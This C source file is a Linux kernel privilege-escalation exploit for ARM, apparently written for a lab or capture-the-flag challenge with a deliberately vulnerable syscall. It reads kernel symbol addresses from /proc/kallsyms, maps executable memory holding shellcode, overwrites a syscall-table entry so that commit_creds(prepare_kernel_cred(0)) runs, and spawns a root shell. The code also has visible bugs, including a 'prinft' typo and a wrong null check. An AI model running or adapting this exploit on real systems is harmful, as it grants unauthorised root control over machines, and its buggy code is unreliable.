#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>
#include<err.h>
#include<sys/syscall.h>
#include<sys/mman.h>

#define NR_SYS_UNUSED 223

void uncalled_function(void);

void **sys_call_table;

/* define the kernel structures */
struct task_struct;
struct cred;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon);
typedef int (*commit_creds_t)(struct cred *new);

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;


/* for finding the kernel module addresses */
void *find_kallsyms_addr(char *name){
  FILE *fp;
  char *line;
  size_t len=0, *addr;

  if((fp = fopen("/proc/kallsyms", "r")) == NULL){
    errx(1,"Error opening /proc/kallsys");
  }

  while(getline(&line, &len, fp) > 0){
    if(strstr(line, name)){
      sscanf(line, "%p", &addr);
      return addr;
    }
  }

  return NULL;
}

/* This is going to be run with kernel permissions */
void get_root_creds(){
  commit_creds(prepare_kernel_cred(0));
}


void vulnerable_syscall(unsigned *address){
  
  // vulnerable syscall will subtract 0x20 if in undercase ascii range
  int i;
  for(i=0;i<4;i++){
    if(*((char *) &address+i)>=0x61 && *((char *) &address+i)<=0x7a)
      *((char *) &address+i) = *((char *) &address+i)+ 0x20;
  }


  // overwrite vulnerable syscall with get_root_creds
  syscall(NR_SYS_UNUSED, &address, &sys_call_table[NR_SYS_UNUSED]);
  printf("[+] vulnerable syscall is overwritten\n");

  // call again to get shell
  syscall(NR_SYS_UNUSED);


}

void *find_sys_call_table_base(void){
  FILE *fp;
  char *line;
  size_t len=0, *addr;

  fp = fopen("/proc/kallsyms", "r");
  if(fp == NULL)
    errx(1, "Error opening System.map");

  while(getline(&line, &len, fp) > 0){
    if(strstr(line, "sys_call_table")){
      sscanf(line, "%p", &addr);
      return addr;
    }
  }

  return NULL;
}

/* shellcode is
 * mov r0,#0x41000000
 * orr r0, r0,#0x00420000
 * orr r0, r0,#0x00004300
 * orr r0, r0,#0x00000044
 * mov pc,r0
 * ascii bytes here are the address to mov to
*/
char shellcode[]="\x41\x04\xa0\xe3\x42\x08\x80\xe3\x43\x0c\x80\xe3\x44\x00\x80\xe3\x00\xf0\xa0\xe1";
void generate_shellcode(char *address){
  char *pointer, *addr;
  unsigned int func_addr;

  printf("get_root_creds at %p\n", get_root_creds);

  pointer = shellcode;
  func_addr = (unsigned int) get_root_creds;
  addr = (char *) &func_addr+3;

  int i;
  for(i=0;i<4;i++){
    *pointer = *addr;
    pointer+=4;
    addr = addr - 1;
  }

  memcpy(address, shellcode, sizeof(shellcode)-1);

}


unsigned int *map_memory_place_shellcode(){

  unsigned address = 0x13371110; //2-byte alignment for arm-instructions
  unsigned page_size = getpagesize();
  unsigned page_mask = ~(page_size - 1);
  unsigned rounded_addr = address & page_mask;
  unsigned diff = address - rounded_addr;
  unsigned len =(sizeof(shellcode)-1 + diff + (page_size -1)) & page_mask;

  char *buffer = mmap((void *) rounded_addr, (size_t) len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);

  if(buffer== MAP_FAILED)
    errx(1, "Couldn't map");

  printf("[+] mapped %p\n", buffer);

  generate_shellcode(buffer+diff);

  return (unsigned int *) address;
}

int main(){

  sys_call_table = find_sys_call_table_base();
  if(sys_call_table == NULL)
    errx(1,"coudln't find sys_call_table base");
  printf("[+] sys_call_table at %p\n", sys_call_table);

  commit_creds = find_kallsyms_addr("commit_creds");
  if(commit_creds == NULL)
    errx(1,"Error finding kallsyms symbol");
  printf("[+] commit_creds at %p\n", commit_creds);

  prepare_kernel_cred = find_kallsyms_addr("prepare_kernel_cred");
  if(commit_creds == NULL)
    errx(1,"Error finding kallsyms symbol");
  printf("[+] prepare_kernel_cred at %p\n", prepare_kernel_cred);

  unsigned *address;
  address = map_memory_place_shellcode();

  vulnerable_syscall(address);

  // should have root now
  if(geteuid() != 0)
    errx(1,"Couldn't get root!\n");
  else{
    prinft("[+] got root shell]n");
    system("/bin/sh");
    exit(1);
  }

  return 0;

}



